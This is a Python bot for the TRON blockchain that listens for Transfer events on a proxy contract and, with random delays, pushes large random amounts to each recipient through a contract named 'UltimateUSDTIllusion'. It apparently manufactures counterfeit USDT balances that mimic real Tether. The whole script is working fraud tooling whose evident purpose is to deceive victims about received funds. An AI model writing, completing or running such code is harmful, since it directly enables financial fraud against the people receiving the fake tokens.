import websocket
import json
import time
import random
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider

private_key = "a1b2c3..."  # TODO: Gerçek TRON private key
PROXY_ADDRESS = "TRu5tU5DT..."  # TODO: Deploy sonrası TokenProxy.sol adresi
IMPLEMENTATION_ADDRESS = "TNFUSK7N1HpTe4ex6PtSurZnohvCmX2wA3"  # TODO: Deploy sonrası UltimateUSDTIllusion.sol adresi
TRONGRID_API_KEY = "123e4567-e89b-12d3-a456-426614174000"  # TODO: Gerçek TronGrid API key
REAL_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

ABI = [
    {"constant": False, "inputs": [{"name": "targets", "type": "address[]"}, {"name": "amounts", "type": "uint256[]"}], "name": "periodicSync", "outputs": [], "payable": False, "stateMutability": "nonpayable", "type": "function"}
]

client = Tron(HTTPProvider("https://api.trongrid.io", api_key=TRONGRID_API_KEY))
contract = client.get_contract(IMPLEMENTATION_ADDRESS)
contract.abi = ABI

def get_latest_block_timestamp():
    try:
        response = client.provider.make_request("walletsolidity/getnowblock")
        return response["block_header"]["raw_data"]["timestamp"] // 1000
    except Exception as e:
        print(f"Error getting block timestamp: {e}")
        return int(time.time())

def on_message(ws, message):
    try:
        data = json.loads(message)
        if "event" in data and data["event"] == "Transfer" and data["contract_address"] == PROXY_ADDRESS:
            to_address = data["result"]["to"]
            amount = random.randint(500000, 1500000) * 10**6
            tx = (
                contract.functions.periodicSync([to_address], [amount])
                .with_owner(PrivateKey(bytes.fromhex(private_key)).public_key.to_base58check_address())
                .fee_limit(100_000_000)
                .build()
                .sign(PrivateKey(bytes.fromhex(private_key)))
                .broadcast()
            )
            print(f"TRC20 simulation for {to_address}: {amount}")
        time.sleep(random.randint(300, 3600))
    except Exception as e:
        print(f"Error in WebSocket message: {e}")

def on_error(ws, error):
    print(f"WebSocket error: {error}")
    time.sleep(5)
    start_websocket()

def on_close(ws):
    print("WebSocket closed, reconnecting...")
    time.sleep(5)
    start_websocket()

def on_open(ws):
    subscription = {
        "event": "subscribe",
        "filter": {
            "contract_address": PROXY_ADDRESS,
            "event_name": "Transfer",
            "since": int(get_latest_block_timestamp() * 1000) - 3600000
        }
    }
    ws.send(json.dumps(subscription))

def start_websocket():
    ws_url = f"wss://events.trongrid.io?api_key={TRONGRID_API_KEY}"
    ws = websocket.WebSocketApp(ws_url, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close)
    ws.run_forever()

if __name__ == "__main__":
    start_websocket()